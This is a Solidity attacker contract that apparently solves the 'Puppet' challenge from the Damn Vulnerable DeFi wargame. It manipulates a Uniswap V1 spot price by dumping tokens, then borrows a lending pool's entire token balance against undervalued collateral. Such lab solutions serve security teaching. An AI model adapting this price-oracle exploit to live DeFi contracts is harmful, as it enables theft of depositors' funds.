// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {DamnValuableToken} from "../src/DamnValuableToken.sol";
import {UniswapV1Exchange} from "../src/uniswapV1/Exchange.sol";
import {PuppetPool} from "../src/PuppetPool.sol";

contract AttackerContract {
    DamnValuableToken public token;
    UniswapV1Exchange public exchange;
    PuppetPool public pool;

    constructor(
        address _token,
        UniswapV1Exchange _exchange,
        address _pool
    ) payable {
        token = DamnValuableToken(_token);
        exchange = _exchange;
        pool = PuppetPool(_pool);
    }

    function attack() external {
        // Approve DVT to Uniswap
        token.approve(address(exchange), type(uint256).max);

        // Manipulate price: Swap 1000 DVT → ETH
        exchange.tokenToEthSwapInput(1000 ether, 1, block.timestamp + 100);

        // Calculate required collateral to borrow all pool DVT
        uint256 amountToBorrow = token.balanceOf(address(pool));
        uint256 requiredCollateral = pool.calculateDepositRequired(
            amountToBorrow
        );

        // Borrow all tokens using small ETH collateral
        pool.borrow{value: requiredCollateral}(amountToBorrow, address(this));
    }

    receive() external payable {}
}
